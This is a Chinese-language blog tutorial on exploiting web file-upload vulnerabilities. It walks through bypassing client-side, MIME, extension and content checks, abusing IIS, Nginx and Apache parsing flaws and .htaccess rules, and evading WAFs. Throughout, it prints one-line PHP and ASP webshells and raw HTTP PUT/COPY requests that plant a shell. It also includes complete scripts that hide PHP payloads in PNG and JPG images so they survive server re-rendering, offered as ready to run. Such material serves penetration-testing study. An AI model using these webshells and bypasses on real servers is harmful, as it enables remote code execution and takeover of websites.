
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>Hexo</title>
        <meta name="author" content="John Doe">
        <meta name="description" content="">
        <meta name="keywords" content="">
        <link rel="icon" href="">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Hexo</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Hexo</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
                </div>
            </a>
            
            <a href="categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
                </div>
            </a>
            
            <a href="tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1> </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/8/24
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。</p>
<p>文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门</p>
<p>常见上传点：</p>
<ol>
<li><code>上传头像</code></li>
<li><code>上传相册</code></li>
<li><code>上传附件</code></li>
<li><code>添加文章图片</code></li>
<li><code>前台留言资料上传</code></li>
<li><code>编辑器文件上传</code></li>
</ol>
<h2 id="检测与绕过"><a href="#检测与绕过" class="headerlink" title="检测与绕过"></a>检测与绕过</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>直接上传一句话木马或shell脚本即可</p>
<h3 id="客户端检测（Javascript检测）"><a href="#客户端检测（Javascript检测）" class="headerlink" title="客户端检测（Javascript检测）"></a>客户端检测（Javascript检测）</h3><p>在网页上写一段Javascript脚本，效验文件上传的后缀名，有白名单形式也有黑名单形式。如果上传文件的后缀不被允许，则会弹窗告知，此时文件上传的数据包并没有发送到服务端，只是在客户端浏览器使用Javascript对数据包进行检测。</p>
<p>这时有两种方法可以绕过客户端Javascript的检测：</p>
<blockquote>
<ul>
<li>使用浏览器插件，删除检测文件后缀的Javascript代码，然后上传文件即可绕过</li>
<li>首先把需要上传的文件后缀改成允许上传的文件类型，如jpg、png、gif等，绕过Javascript检测，再抓包，把后缀名改成可执行文件的后缀即可上传成功</li>
</ul>
</blockquote>
<h3 id="服务端检测（MINE类型检测）"><a href="#服务端检测（MINE类型检测）" class="headerlink" title="服务端检测（MINE类型检测）"></a>服务端检测（MINE类型检测）</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。</p>
<p>服务器代码判断$_FILES[”file“][“type”]是不是图片格式（<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>），如果不是，则不允许上传该文件。</p>
<p>绕过方法：</p>
<blockquote>
<p>抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的<code>Content-Type:application/octet-stream</code>修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>等就可以</p>
</blockquote>
<p>常见MIMETYPE</p>
<blockquote>
<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
<h3 id="服务端检测（目录路径检测）"><a href="#服务端检测（目录路径检测）" class="headerlink" title="服务端检测（目录路径检测）"></a>服务端检测（目录路径检测）</h3><p>虽然提供了名单检测，但在上传文件时，服务端采用了路径拼接的方式保存文件，而路径我们可以控制。可以采用%00截断，检测时在%00添加合法后缀通过检测，后端获取路径时会当作空格舍弃后面的内容。</p>
<p>绕过方法:</p>
<blockquote>
<ul>
<li>例如：&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
</ul>
</blockquote>
<h3 id="服务端检测（文件扩展名检测）"><a href="#服务端检测（文件扩展名检测）" class="headerlink" title="服务端检测（文件扩展名检测）"></a>服务端检测（文件扩展名检测）</h3><p>绕过方法：</p>
<h4 id="使用其它后缀文件"><a href="#使用其它后缀文件" class="headerlink" title="使用其它后缀文件"></a>使用其它后缀文件</h4><pre><code>PHP:
php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)
ASP：
asa、cer、cdx
ASPX：
ascx、ashx、asac
JSP：
jsp、jspx、jspf
</code></pre>
<h4 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h4><p>采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。</p>
<p>通过抓包截断将 backlion.asp.jpg 后面的一个.换成%00 在上传的时候即 backlion.asp%00.jpg，当文件系统读到%00 时，会认为文件已经结束，从而将 backlion.asp.jpg 的内容写入到 backlion.asp 中，从而达到攻击的目的。%00 不是针对所有基于白名单的后缀名检查都能绕过，代码的实现过程中必须存在截 断上传漏洞，上传格式如下：bk.asp%00.jpg</p>
<p>注意：如果%00截断在POST，因为POST不会像GET对%00进行自动解码，所以需要在二进制中进行修改。</p>
<h4 id="利用文件解析规则绕过"><a href="#利用文件解析规则绕过" class="headerlink" title="利用文件解析规则绕过"></a>利用文件解析规则绕过</h4><p> 上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释</p>
<h5 id="IIS-5-x-x2F-6-0解析漏洞"><a href="#IIS-5-x-x2F-6-0解析漏洞" class="headerlink" title="IIS 5.x&#x2F;6.0解析漏洞"></a>IIS 5.x&#x2F;6.0解析漏洞</h5><p>1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下：<br>漏洞目录利用形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp/xx.jpg%E3%80%82">www.xxx.com/xx.asp/xx.jpg。</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。<br>2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp<br>漏洞文件利用形式：<a target="_blank" rel="noopener" href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>xx.jpg的内容可以为一段合法的asp脚本文件。</p>
<p>检测流程为：</p>
<pre><code class="none">www.xxx.com/xxx.asp;xxx.jpg
N1:从头部查找查找&quot;.&quot;号,获得&quot;.asp;xxxx.jpg&quot;
N2:查找&quot;;&quot;号,如果有则内存截断
N3:查找&quot;/&quot;,如果有则内存截断
</code></pre>
<p>因此，.asp将最终被保存下来，IIS6只简单地根据扩展名来识别，所以从脚本映射表中里查找脚本与扩展名对比，并利用asp.dll来解析。导致最终的问题产生。</p>
<p>对于此问题，微软并不认为这是一个漏洞，同样也没推出IIS6.0解析漏洞的补丁。因此在IIS6.0的网站下，此问题仍然可以尝试是否存在。</p>
<h5 id="IIS-6-0-PUT上传漏洞"><a href="#IIS-6-0-PUT上传漏洞" class="headerlink" title="IIS 6.0 PUT上传漏洞"></a>IIS 6.0 PUT上传漏洞</h5><p>WebDAV 基于HTTP1.1协议的通信协议使得HTTP支持PUT MOVE COPY DELETE 方法。</p>
<p>探测是否存在IIS PUT漏洞</p>
<pre><code>OPTIONS / HTTP1.1
Host: www.xxx.com
</code></pre>
<p>传txt文本文件</p>
<pre><code> PUT /a.txt HTTP1.1 Host: www.xxx.com Content-Length:30

&lt;%eval request(“cmd”)%&gt;
</code></pre>
<p>通过Move或Copy重名</p>
<pre><code>COPY /a.txt HTTP1.1 Host: www.xxx.com Destination: http://www.xxx.com/cmd.asp
</code></pre>
<p>删除</p>
<pre><code>DELETE /a.txt HTTP1.1 Host: www.xxx.com
</code></pre>
<h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><p>在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。为什么是由于PHP-CGI的原因呢，因为在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的，当URL中有不存在的文件时，PHP就会默认向前解析。</p>
<p> 普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。访问 ”<a target="_blank" rel="noopener" href="http://www.xx.com/phpinfo.jpg/1.php%E2%80%9D">www.xx.com/phpinfo.jpg/1.php”</a> 这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg&#x2F;1.php”，然后构造成SCRIPT_FILENAME传递给PHP-CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p> 在默认Fast-CGI开启状况下上传名字为xx.jpg,内容为:<br><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>然后访问xx.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。同样利用phpstudy说明，上传1.jpg格式的文件，内容为访问phpinfo，即可触发</p>
<h5 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><p>Apache 在1.x和2.x版本中存在解析漏洞，例如如下地址格式：</p>
<pre><code class="none">www.xxxx.com/apache.php.bbb.aaa
</code></pre>
<p>Apache从右至左开始判断后缀，若aaa非可识别后缀，再判断bbb，直到找到可识别后缀为止，然后将该可识别后缀进解析，因此如上地址解析为访问apache.php文件</p>
<p>Apache允许文件有多个后缀名，并会按照第一个点来分析文件后缀，例如file.html.en。Apache按照每个点来分割后缀名，因此此文件名为.html、.en。由于en后缀不被识别，便继续向前解析。</p>
<p> 另外对于Apache解析漏洞的正确说法应该是，使用module模式与php结合的所有版本 apache存在未知扩展名解析漏洞，使用fastcig模式与php结合的所有版本apache不存在此漏洞。而是否解析的后缀名在文件mime.types中查找是否出现。</p>
<h4 id="htaccess规则文件绕过"><a href="#htaccess规则文件绕过" class="headerlink" title=".htaccess规则文件绕过"></a>.htaccess规则文件绕过</h4><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。</p>
<p> 概述来说，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p> 在一些启用了.htaccess文件的网站上就可以使用此文件类型来绕过限制较全面的黑名单过滤。</p>
<ul>
<li>针对黑名单绕过</li>
</ul>
<p>创建一个txt文件，写入</p>
<pre><code class="text">AddType  application/x-httpd-php    .png
</code></pre>
<p>另存为 <code>.htaccess</code> 名称，保存类型为所有文件，即可将<code>png</code>文件解析为<code>php</code>文件。</p>
<ul>
<li>留后门</li>
</ul>
<p>在<code>.htaccess</code> 内写入<code>php</code>解析规则，类似于把文件名包含<code>s</code>的解析成<code>php</code>文件</p>
<pre><code class="text">&lt;FilesMatch &quot;s&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p><code>shell.png</code> 就会以<code>php</code>文件执行</p>
<ul>
<li>利用.htaccess进行文件包含</li>
</ul>
<pre><code class="text">php_value auto_prepend_file &quot;.htaccess&quot;
#&lt;?php eval($_POST[cmd]);?&gt;
</code></pre>
<ul>
<li>使用#注释使得.htaccess能够成功解析</li>
</ul>
<h4 id="Windows环境特性绕过"><a href="#Windows环境特性绕过" class="headerlink" title="Windows环境特性绕过"></a>Windows环境特性绕过</h4><p>:$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名</p>
<p>即：xxx.php::$DATA &#x3D; xxx.php</p>
<p>windows文件名最后不能有.或空格，可设为<code>*.php.</code>或<code>*.php+</code>进行绕过</p>
<p>windows下文件名不区分大小写，linux下文件名区分大小写</p>
<h4 id="文件名大小写绕过"><a href="#文件名大小写绕过" class="headerlink" title="文件名大小写绕过"></a>文件名大小写绕过</h4><p>针对文件名检查未忽略大小写</p>
<h4 id="点空格绕过"><a href="#点空格绕过" class="headerlink" title="点空格绕过"></a>点空格绕过</h4><p>原理是1.php+(点+空格+点)上传时，</p>
<ul>
<li>首先，删除文件名末尾的点，变成1.php+点+空格，</li>
<li>然后，通过strrchar函数来确认文件的后缀名为.php+点+空格，</li>
<li>接着，将文件的后缀名转换为小写、去除字符串::$DATA、首尾去空，变成.php+点，</li>
<li>最后，判断文件后缀名是否在黑名单内。由于“.php.”不在黑名单中，可以通过校验，而windows特性，保存文件时会自动去掉后缀名中最后的”.”，最终文件成功上传并保存为1.php。</li>
</ul>
<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>针对会将文件名中的关键词删除的检查</p>
<h4 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h4><h5 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h5><p>找到渲染后未改变的地方，在那写马即可</p>
<h5 id="png"><a href="#png" class="headerlink" title="png"></a>png</h5><h6 id="写入PLTE数据块"><a href="#写入PLTE数据块" class="headerlink" title="写入PLTE数据块"></a>写入PLTE数据块</h6><p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
<p>在PLTE数据块写入php代码：</p>
<p><img src="/%E4%B9%9D%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20220404110032852.png" alt="image-20220404110032852"></p>
<p>计算PLTE数据块的CRC</p>
<pre><code>import binascii
import re

png = open(r&#39;2.png&#39;,&#39;rb&#39;)
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)

&#39;&#39;&#39; PLTE crc &#39;&#39;&#39;
data =  &#39;504c5445&#39;+ re.findall(&#39;504c5445(.*?)49444154&#39;,hexstr)[0]
crc = binascii.crc32(data[:-16].decode(&#39;hex&#39;)) &amp; 0xffffffff
print hex(crc)
</code></pre>
<p>修改CRC值</p>
<p><img src="/%E4%B9%9D%EF%BC%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/image-20220404110108576.png" alt="image-20220404110108576"></p>
<h6 id="写入IDAT数据块"><a href="#写入IDAT数据块" class="headerlink" title="写入IDAT数据块"></a>写入IDAT数据块</h6><p>国外大牛写的脚本,直接拿来运行即可.</p>
<pre><code>&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
&#125;

imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre>
<p>运行后得到1.png</p>
<h5 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a>jpg</h5><p>采用国外大牛编写的脚本jpg_payload.php</p>
<pre><code>&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
        die(&#39;php-gd is not installed&#39;);
    &#125;

    if(!isset($argv[1])) &#123;
        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
    &#125;

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) &#123;
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) &#123;
            die(&#39;Incorrect SOI marker&#39;);
        &#125;

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) &#123;
                $startPos = $dis-&gt;seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) &#123;
                    while((!$dis-&gt;eof())) &#123;
                        if($dis-&gt;readByte() === 0xFF) &#123;
                            if($dis-&gt;readByte !== 0x00) &#123;
                                break;
                            &#125;
                        &#125;
                    &#125;
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                &#125; elseif($correctImage) &#123;
                    $outStream = $outStreamTmp;
                &#125; else &#123;
                    break;
                &#125;
                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
                    die(&#39;Success!&#39;);
                &#125; else &#123;
                    break;
                &#125;
            &#125;
        &#125;
    &#125;
    unlink(&#39;payload_&#39;.$argv[1]);
    die(&#39;Something\&#39;s wrong&#39;);

    function checkImage($filename, $data, $unlink = FALSE) &#123;
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    &#125;

    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) &#123;
            if(isset($m[1])) &#123;
                $extraBytes = (int)$m[1];
            &#125;
        &#125;
    &#125;

    class DataInputStream &#123;
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) &#123;
            $this-&gt;binData = &#39;&#39;;
            $this-&gt;order = $order;
            if(!$fromString) &#123;
                if(!file_exists($filename) || !is_file($filename))
                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
                $this-&gt;binData = file_get_contents($filename);
            &#125; else &#123;
                $this-&gt;binData = $filename;
            &#125;
            $this-&gt;size = strlen($this-&gt;binData);
        &#125;

        public function seek() &#123;
            return ($this-&gt;size - strlen($this-&gt;binData));
        &#125;

        public function skip($skip) &#123;
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        &#125;

        public function readByte() &#123;
            if($this-&gt;eof()) &#123;
                die(&#39;End Of File&#39;);
            &#125;
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        &#125;

        public function readShort() &#123;
            if(strlen($this-&gt;binData) &lt; 2) &#123;
                die(&#39;End Of File&#39;);
            &#125;
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) &#123;
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            &#125; else &#123;
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            &#125;
            return $short;
        &#125;

        public function eof() &#123;
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        &#125;
    &#125;
?&gt;
</code></pre>
<p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
<p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code></p>
<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-2">https://xz.aliyun.com/t/2657#toc-2</a></p>
<h5 id="直接对文件加载器攻击"><a href="#直接对文件加载器攻击" class="headerlink" title="直接对文件加载器攻击"></a>直接对文件加载器攻击</h5><p>对于一些二次渲染</p>
<pre><code class="text">上传文件数据不完整的gif文件 -&gt; 触发报错imagecreatefromgif()函数
上传文件数据不完整的png文件 -&gt; 触发报错imagecreatefrompng()函数
</code></pre>
<p>对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access&#x2F;mdb溢出。</p>
<p>建议参考CVE</p>
<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>源文件上传后经过检测处理后会删除，那么我们大量上传在删除前访问即可</p>
<h3 id="服务器检测（文件内容检测）"><a href="#服务器检测（文件内容检测）" class="headerlink" title="服务器检测（文件内容检测）"></a>服务器检测（文件内容检测）</h3><h4 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h4><p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<pre><code class="text">.jpg	FF D8 FF E0 00 10 4A 46 49 46
.gif	47 49 46 38 39 61
.png	89 50 4E 47
</code></pre>
<h4 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h4><p>图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<ul>
<li>例如下面结构</li>
</ul>
<pre><code class="text">GIF89a
(...some binary data for image...)
&lt;?php phpinfo(); ?&gt;
(... skipping the rest of binary data ...)
</code></pre>
<p>另一种是判断是否包含<code>&lt;?</code>或者<code>php</code></p>
<ul>
<li><p>绕过<code>&lt;?</code>：</p>
<pre><code class="text">&lt;script language=&#39;php&#39;&gt;@eval($_POST[cmd]);&lt;/script&gt;
</code></pre>
</li>
<li><p>绕过<code>php</code>：</p>
<pre><code class="text">&lt;?= @eval($_POST[&#39;cmd&#39;]);?&gt;
</code></pre>
</li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><h5 id="填充垃圾数据绕过"><a href="#填充垃圾数据绕过" class="headerlink" title="填充垃圾数据绕过"></a>填充垃圾数据绕过</h5><p>有些主机 WAF 软件为了不影响web服务器的性能，会对校验的用户数据设置 大小上限，比如 1M。此种情况可以构造一个大文件，前面 1M 的内容为垃圾内 容，后面才是真正的木马内容，便可以绕过 WAF 对文件内容的校验。可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<h5 id="文件扩展名出回车绕过（只支持-php）"><a href="#文件扩展名出回车绕过（只支持-php）" class="headerlink" title="文件扩展名出回车绕过（只支持 php）"></a>文件扩展名出回车绕过（只支持 php）</h5><pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; filename=&quot;bk.ph
p&quot; Content-Type: image/jpeg
</code></pre>
<p>或</p>
<pre><code>Content-Disposition: form-data; nAme=&quot;upfile&quot;; fi
lename=&quot;bk.php&quot; Content-Type: image/jpeg
</code></pre>
<h5 id="filename-绕过"><a href="#filename-绕过" class="headerlink" title="filename 绕过"></a>filename 绕过</h5><p>针对早期版本安全狗，可以多加一个 filename 在一个 Content-Disposition 中，存在多个 filename ，协议解析应该使用最 后的filename 值作为文件名。如果 WAF 解析到 filename&#x3D;”bk.jpg”认为解析 到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是 bk.asp。</p>
<pre><code>Content-Disposition: form-data; name=&quot;file1&quot;;

filename=&quot;bk.jpg&quot;;filename=&quot;bk.asp&quot;
</code></pre>
